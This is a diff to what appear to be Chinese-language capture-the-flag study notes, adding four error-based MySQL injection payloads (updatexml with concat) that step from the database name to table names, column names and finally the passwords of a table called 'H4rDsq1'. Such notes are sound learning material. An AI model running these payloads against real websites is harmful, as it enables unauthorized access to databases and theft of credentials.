@@ -377,5 +377,10 @@ echo serialize($a);
 查看源码，拿到flag。
 关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
 
-1'or(updatexml(1,concat(0x7e,database()),1))#
-1'or(updatexml(1,concat(0x7e,select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),1))#
+`1'or(updatexml(1,concat(0x7e,database()),1))#`
+`1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),1))#`
+`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))#`
+1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1))),1))#
+
+
+
